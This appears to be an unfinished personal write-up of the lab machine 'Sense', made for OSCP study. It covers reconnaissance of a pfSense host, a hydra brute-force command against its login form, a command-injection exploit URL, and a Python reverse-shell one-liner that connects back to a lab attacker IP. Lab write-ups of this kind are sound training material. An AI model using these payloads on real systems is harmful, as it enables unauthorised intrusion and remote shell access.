# Sense
Name: Sense
Date:  
Difficulty:  Easy
Goals:  OSCP Prep
Learnt: 
- When you get banned learn how to proxy!

## Recon
The time to live(ttl) indicates its OS. It is a decrementation from each hop back to original ping sender. Linux is < 64, Windows is < 128.
![ping](ping.png)

![lightpd](lighttpd-1-4-35.png)

Nmap found /tree

![tree](silverstripetreedirectory.png)

![links](treeoflinks.png)

![changelog](changelogDOTtxt.png)

Blocked out non multiples of less than 3
![sense](oneofthreevulns.png)
2.2 - 2.4

Research pfsense_ng
[Documentation: Feature list 2.0](https://docs.netgate.com/pfsense/en/latest/releases/2-0-0.html)
FreeBSD!

Basically tried some of the exploits
I missed the system-users.txt file, because I did not proxy after being banned. Checked the video, after one of the exploits required authenication and I tried the others..

![sad](sadban.png)

Tried:
```bash
hydra -l Rohit -P /usr/share/wordlists/rockyou.txt -f 10.129.63.73 http-post-form '/index.php:__csrf_magic=sid%3A9b9199df3b86ab6e2c7871980c946b040c5ac939%2C1662233351&usernamefld=^USER^&passwordfld=^PASS^&login=Login:F=incorrect'
```
Then tried pfsense as password with rohit, not Rohit.

## Exploit

Secondly I changed the exploit to handle string concatenation properly in 3.10 python:

```python
login_url = f"https://{rhost}/index.php"
exploit_url = f"https://{rhost}/status_rrd_graph_img.php?database=queues;printf\'{payload}\'|sh"
```

This also did not work, 

```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.19",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```

## Foothold

## PrivEsc

      
